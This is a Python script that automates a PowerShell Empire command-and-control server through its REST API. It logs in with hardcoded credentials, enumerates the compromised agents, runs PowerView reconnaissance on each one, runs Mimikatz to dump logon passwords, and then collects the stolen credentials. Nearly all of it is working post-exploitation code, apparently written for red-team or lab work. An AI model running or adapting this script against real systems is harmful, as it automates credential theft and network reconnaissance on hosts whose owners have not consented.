#! /usr/bin/env python3

import requests
import sys
import re
from time import sleep
from requests import ConnectionError

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def empireLogin(empire_username, empire_password):
	jPayload = {'username': empire_username,
		    'password': empire_password}
	print ('[+] Logging into Powershell Empire REST API to retrieve token')
	try:
		loginRequest = requests.post(base_url + '/api/admin/login', json=jPayload, headers=headers, verify=False)

		if loginRequest.status_code == 200:
			token['token'] = loginRequest.json()['token']
		else:
			print ("Authenitcation Failure")
	except ConnectionError:
		print ('Connection Error.')
		sys.exit(1)

def empireGetAgents():
	print ('[+] Gathering Agents from Empire')
	agentRequest = requests.get(base_url + '/api/agents', params=token, verify=False)
	if agentRequest.status_code == 200:
		return agentRequest.json()
	print(agentRequest.json())

def empireGetAgentResults(agent_name):
	results = requests.get(base_url + '/api/agents/{}/results'.format(agent_name), params=token, verify=False)
	if results.status_code == 200:
		return results.json()
	print (results.json())

def empireExecuteModule(module_name, agent_name, module_options=None):
	payload = {'Agent': agent_name}
	try:
		request = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
		if request.status_code == 200:
			request = request.json()
			print ("[+] Executed Module => success: {} taskID: {} msg: '{}'".format(request['success'], request['taskID'], request['msg']))
			return request
		else:
			print ("Error Executing Module '{}': {}".format(module_name, request.json()), agent_name)
	except Exception as e:
		print ("Error executing module '{}': {}".format(module_name, e), agent_name)

def empireExecuteModuleWithResults(module_name, agent_name, module_options=None):
	r = empireExecuteModule(module_name, agent_name, module_options)
	while True:
		for result in empireGetAgentResults(agent_name)['results']:
			if result['taskID'] == r['taskID']:
				if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
					print (result['results'])
					return result['results']

def getCreds():
	request = requests.get(base_url + '/api/creds', params=token, headers=headers, verify=False)
	if request.status_code == 200:
		request = request.json()
		print (request)

def reconProcesses(agent_name):
	print ('[+] Starting Recon on ' + str(agent_name))
	module_name = "powershell/situational_awareness/network/powerview/get_loggedon"
	empireExecuteModuleWithResults(module_name, agent_name)
	module_name = "powershell/situational_awareness/network/powerview/get_domain_controller"
	empireExecuteModuleWithResults(module_name, agent_name)
	module_name = "powershell/credentials/mimikatz/logonpasswords"
	empireExecuteModule(module_name, agent_name)
	print ('[+] Waiting for ' + module_name + ' to execute on ' + agent_name)
	sleep(25)
	getCreds()



if __name__ == "__main__":


	headers = {'Content-Type': 'application/json'}
	token = {'token': None}

	base_url = "https://172.31.4.139:1337"

	empire_username = "empireadmin"
	empire_password = 'Password123!'

	empireLogin(empire_username, empire_password)

	agents = {}

	empireGetAgents
	for agent in empireGetAgents()['agents']:
		agent_name = agent['name']
		agents[agent_name] = {'id': agent['ID'],
				      'ip': agent['external_ip'],
				      'hostname': agent['hostname'],
				      'username': agent['username'],
				      'os': agent['os_details']}
		reconProcesses(agent_name)
